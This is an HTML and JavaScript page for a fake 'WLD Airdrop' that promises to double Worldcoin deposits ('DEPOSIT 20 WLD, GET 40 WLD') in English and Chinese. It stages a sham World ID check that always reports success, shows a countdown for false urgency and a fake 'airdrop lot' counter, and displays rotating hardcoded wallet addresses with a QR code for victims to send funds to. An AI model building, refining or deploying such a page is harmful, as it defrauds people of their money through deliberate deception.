<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WLD Airdrop</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{
  width:100%;
  height:100%;
  font-family:Inter,system-ui,sans-serif;
  background:#f2f2f2;
  overflow:hidden;
}

/* ===== SCREEN ===== */
.screen{
  position:absolute;
  inset:0;
}

/* ===== TEXTOS PRINCIPALES ===== */
.top-text{
  position:absolute;
  top:8%;
  width:100%;
  height:40%;
  z-index:2;
  display:flex;
  align-items:center;
  justify-content:center;
}

.text-group{
  display:flex;
  flex-direction:column;
  gap:14px;
}

.main-line{
  font-size:32px;
  font-weight:800;
  letter-spacing:2px;
  text-align:center;
  min-height:40px;
}

.char{
  display:inline-block;
  opacity:0;
  transform:scale(1.8);
  filter:blur(4px);
  transition:.4s;
}
.char.visible{
  opacity:1;
  transform:scale(1);
  filter:blur(0);
}

/* ===== BOTÓN ===== */
.bottom-center{
  position:absolute;
  top:55%;
  width:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:18px;
  z-index:2;
}

.logo{
  width:90px;
  animation:spin 20s linear infinite;
}
@keyframes spin{to{transform:rotateY(360deg)}}

#verifyBtn{
  padding:14px 34px;
  border:none;
  border-radius:10px;
  background:#000;
  color:#fff;
  letter-spacing:2px;
  cursor:pointer;
  min-width:260px;
  height:50px;
}

/* ===== FONDO ===== */
.bg-layer{
  position:absolute;
  inset:0;
  overflow:hidden;
  z-index:1;
  opacity:.45;
  filter:blur(5px);
}
.bg-text{
  position:absolute;
  white-space:nowrap;
  font-weight:800;
  animation:floatText linear infinite;
}
@keyframes floatText{
  0%{opacity:0;transform:translateX(var(--from))}
  20%{opacity:var(--op)}
  40%{opacity:var(--op)}
  100%{opacity:0;transform:translateX(var(--to))}
}

/* ===== MODAL ===== */
#modalBox{
  display:none;
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  background:#fff;
  padding:32px 40px;
  border-radius:16px;
  box-shadow:0 20px 50px rgba(0,0,0,.25);
  z-index:99;
  font-size:22px;
  font-weight:800;
}

/* ===== SCREEN 2 ===== */
#screen2{
  display:none;
  position:absolute;
  inset:0;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:18px;
}

.static-text{
  font-size:28px;
  font-weight:900;
  color:#000;
  letter-spacing:3px;
}

/* CONTADOR DESTACADO */
#dateCountdown{
  font-size:48px;
  font-weight:900;
  letter-spacing:4px;
}

/* QR BOX CENTRAL */
.qr-box{
  display:flex;
  align-items:center;
  justify-content:center;
  width:100%;
}

/* QR STYLES */
.qr-box canvas{
  background:#fff;
  padding:12px;
  border-radius:14px;
}

/* COPY STYLES */
.deposit-code{
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:6px;
}
.deposit-code input{
  width:320px;
  padding:10px;
  text-align:center;
}
.deposit-code button{
  margin-top:6px;
  padding:10px 22px;
  border:none;
  background:#000;
  color:#fff;
}

#airdropLot{
  margin-top:14px;
  font-size:18px;
  font-weight:800;
  letter-spacing:2px;
}

/* ===== RESPONSIVE ===== */
@media(max-width:600px){
  .main-line{font-size:20px}
  .logo{width:70px}
  #verifyBtn{min-width:200px;height:45px;font-size:14px}
  #dateCountdown{font-size:36px}
  .deposit-code input{width:260px}
  .static-text{font-size:24px}
}
</style>
</head>

<body>

<!-- SCREEN 1 -->
<div class="screen" id="screen1">
  <div class="bg-layer" id="bgLayer"></div>
  <div class="top-text">
    <div class="text-group">
      <div class="main-line" id="l1"></div>
      <div class="main-line" id="l2"></div>
      <div class="main-line" id="l3"></div>
    </div>
  </div>
  <div class="bottom-center">
    <img src="logowld.png" class="logo">
    <button id="verifyBtn">VERIFY WORLD ID</button>
  </div>
</div>

<!-- MODAL -->
<div id="modalBox"><span id="modalText">VERIFICANDO...</span></div>

<!-- SCREEN 2 -->
<div class="screen" id="screen2">

  <!-- LOGO GIRATORIO arriba -->
  <img src="logowld.png" class="logo">

  <!-- TEXTO ESTÁTICO -->
  <div class="static-text">AIRDROP END</div>

  <!-- CONTADOR HH:MM:SS -->
  <div id="dateCountdown"></div>

  <!-- QR CENTRADO -->
  <div class="qr-box">
    <canvas id="qrCanvas" width="160" height="160"></canvas>
  </div>

  <!-- COPY -->
  <div class="deposit-code">
    <input id="addr" readonly>
    <button id="copyBtn">COPY ADDRESS</button>
  </div>

  <!-- AIRDROP LOT -->
  <div id="airdropLot">
    AIRDROP LOT: <span id="lotValue">0</span>
  </div>

</div>

<script>

/* ===== SCREEN 1 TEXTOS ===== */
const TEXTS1=[
  "100% EARN AIRDROP","DEPOSIT 20 WLD","GET 40 WLD",
  "100% 获得空投","存入 20 WLD","获得 40 WLD"
];

const lines=[l1,l2,l3];
let idx1=0;

async function type1(el,text){
  el.innerHTML="";
  for(const c of text){
    const s=document.createElement("span");
    s.className="char";
    s.innerHTML=c===" "?"&nbsp;":c;
    el.appendChild(s);
    s.classList.add("visible");
    await new Promise(r=>setTimeout(r,40));
  }
}

async function loop1(){
  for(let i=0;i<3;i++) await type1(lines[i],TEXTS1[(idx1+i)%TEXTS1.length]);
  idx1=(idx1+3)%TEXTS1.length;
  setTimeout(()=>lines.forEach(l=>l.innerHTML=""),3000);
}

loop1(); setInterval(loop1,7000);

/* ===== FONDO ===== */
function spawnBg(){
  const t=document.createElement("div");
  t.className="bg-text";
  t.textContent=TEXTS1[Math.random()*TEXTS1.length|0];
  t.style.fontSize=(Math.random()*36+42)+"px";
  t.style.top=Math.random()*85+"%";
  const d=Math.random()>.5;
  t.style.setProperty("--from",d?"-120%":"120%");
  t.style.setProperty("--to",d?"120%":"-120%");
  t.style.setProperty("--op",(Math.random()*.15+.2).toFixed(2));
  t.style.animationDuration=(Math.random()*20+28)+"s";
  bgLayer.appendChild(t);
  setTimeout(()=>t.remove(),50000);
}
setInterval(spawnBg,2600);

/* ===== VERIFY ===== */
verifyBtn.onclick=()=>{
  modalBox.style.display="block";
  modalText.style.color="#000";
  modalText.innerText="VERIFICANDO...";
  setTimeout(()=>{
    modalText.style.color="green";
    modalText.innerText="WORLD ID VERIFICADO";
    setTimeout(()=>{
      modalBox.style.display="none";
      screen1.style.display="none";
      screen2.style.display="flex";
      startTimer();
      startQR();
    },2000);
  },4000);
};

/* ===== CONTADOR ===== */
const dateEl=document.getElementById("dateCountdown");
const lotEl=document.getElementById("lotValue");

function startTimer(){
  setInterval(()=>{
    const now=new Date();
    const diff=new Date("2026-01-11T00:00:00")-now;
    const h=Math.floor(diff/36e5)%24;
    const m=Math.floor(diff/6e4)%60;
    const s=Math.floor(diff/1e3)%60;
    dateEl.innerText=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
  },1000);

  /* ===== AIRDROP LOT estático ===== */
  const startYear=new Date(new Date().getFullYear(),0,1);
  const secondsSince=Math.floor((Date.now()-startYear.getTime())/1000);
  lotEl.innerText=secondsSince.toLocaleString();
}

/* ===== QR ===== */
const WALLETS=[
  "0x1f62e7890d5db2c94c280547876b050f5d1816c5",
  "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
];
let wi=0;
const qr=new QRious({element:qrCanvas,size:160,value:WALLETS[0]});
addr.value=WALLETS[0];

function startQR(){
  setInterval(()=>{
    wi=(wi+1)%WALLETS.length;
    qr.set({value:WALLETS[wi]});
    addr.value=WALLETS[wi];
  },20000);
}

/* ===== COPY ===== */
copyBtn.onclick=()=>navigator.clipboard.writeText(addr.value);

</script>

</body>
</html>
